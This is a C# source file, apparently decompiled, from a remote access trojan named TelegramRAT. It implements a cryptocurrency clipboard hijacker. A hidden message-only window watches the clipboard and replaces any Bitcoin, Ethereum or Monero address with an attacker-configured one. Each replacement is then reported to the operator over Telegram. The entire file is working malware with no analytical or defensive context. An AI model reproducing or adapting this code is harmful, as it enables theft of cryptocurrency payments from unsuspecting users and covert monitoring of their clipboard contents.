using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace TelegramRAT;

public sealed class ClipboardNotification
{
	public class NotificationForm : Form
	{
		private static string currentClipboard = Clipboard.GetText();

		public NotificationForm()
		{
			NativeMethods.SetParent(((Control)this).get_Handle(), NativeMethods.HWND_MESSAGE);
			NativeMethods.AddClipboardFormatListener(((Control)this).get_Handle());
		}

		private bool RegexResult(Regex pattern)
		{
			if (pattern.Match(currentClipboard).Success)
			{
				return true;
			}
			return false;
		}

		protected override void WndProc(ref Message m)
		{
			if (((Message)(ref m)).get_Msg() == 797)
			{
				currentClipboard = Clipboard.GetText();
				if (RegexResult(PatternRegex.btc) && !currentClipboard.Contains(config.bitcoin_address) && !string.IsNullOrEmpty(config.bitcoin_address))
				{
					Clipboard.SetText(PatternRegex.btc.Replace(currentClipboard, config.bitcoin_address));
					telegram.sendText("\ud83d\udcb8 Replaced bitcoin address \"" + currentClipboard + "\" to \"" + config.bitcoin_address + "\"");
				}
				if (RegexResult(PatternRegex.eth) && !currentClipboard.Contains(config.etherium_address) && !string.IsNullOrEmpty(config.etherium_address))
				{
					Clipboard.SetText(PatternRegex.eth.Replace(currentClipboard, config.etherium_address));
					telegram.sendText("\ud83d\udcb8 Replaced etherium address \"" + currentClipboard + "\" to \"" + config.etherium_address + "\"");
				}
				if (RegexResult(PatternRegex.xmr) && !currentClipboard.Contains(config.monero_address) && !string.IsNullOrEmpty(config.monero_address))
				{
					Clipboard.SetText(PatternRegex.xmr.Replace(currentClipboard, config.monero_address));
					telegram.sendText("\ud83d\udcb8 Replaced monero address \"" + currentClipboard + "\" to \"" + config.monero_address + "\"");
				}
			}
			((Form)this).WndProc(ref m);
		}
	}
}
